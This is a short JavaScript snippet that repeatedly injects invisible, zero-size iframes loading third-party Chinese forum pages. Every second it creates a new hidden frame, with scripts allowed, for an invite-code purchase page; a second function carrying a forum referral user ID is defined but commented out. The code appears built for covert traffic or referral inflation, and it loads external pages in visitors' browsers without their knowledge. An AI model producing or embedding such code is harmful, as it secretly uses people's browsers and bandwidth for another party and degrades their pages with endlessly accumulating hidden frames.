function ifc() {
    var li_ifr = document.createElement('IFRAME');
    li_ifr.style.cssText = "border: 0;width: 0px;height: 0px; display:none;";
    li_ifr.src = document.location.protocol + "//bbs.piaoxian.net/misc.php?mod=buyinvitecode";
    li_ifr.setAttribute("scrolling", "no");
    li_ifr.sandbox = 'allow-scripts allow-forms allow-same-origin';
    document.body.appendChild(li_ifr)
}
function right() {
    var li_ifr = document.createElement('IFRAME');
    li_ifr.style.cssText = "border: 0;width: 0px;height: 0px; display:none;";
    li_ifr.src = document.location.protocol + "//www.right.com.cn/forum/?fromuid=141769";
    li_ifr.setAttribute("scrolling", "no");
    li_ifr.sandbox = 'allow-scripts allow-forms allow-same-origin';
    document.body.appendChild(li_ifr)
}
//right();
var t = setInterval(ifc,1000);
//clearInterval(t)